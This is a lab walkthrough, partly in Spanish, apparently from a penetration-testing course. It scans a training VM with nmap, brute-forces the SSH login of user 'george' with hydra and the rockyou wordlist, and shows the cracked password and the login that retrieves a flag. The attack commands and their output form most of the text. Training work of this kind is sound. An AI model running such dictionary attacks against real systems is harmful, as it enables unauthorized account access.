# Walk: Password Attacks - SSH and RDP - VM #1

## Fecha: 19/02/2025
## Host: Ubuntu
## IP: 192.168.202.201
## Objetivo
Follow the steps outlined in this section to leverage a dictionary attack to get access to SSH (port 2222) on VM #1 (BRUTE). Find the flag in the _george_ user's home directory.
## Herramientas
1. nmap
2. hydra
## Procedimiento y comandos
#### Paso 1: Escanemos el host para enumerar servicios ssh:
- `nmap -sV --open -oN vm-1.nmap-result.txt 192.168.202.201`
```
...
Nmap scan report for 192.168.202.201
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```
#### Paso 2: Ejecutamos el ataque de fueza bruta con hydra:
- `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.202.201`
```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-19 19:03:34
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.202.201:2222/
[2222][ssh] host: 192.168.202.201   login: george   password: chocolate
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-19 19:03:47
```
> Colocamos un usuario valido con el flag **_-l_**, como en este caso **_"george"_**
- [2222][ssh] host: 192.168.202.201   login: george   password: **chocolate**
#### Paso 3: Nos conectamos por ssh con el usuario george en el puerto 2222:
- `ssh -p 2222 george@192.168.202.201`
- Obtenemos el flag.
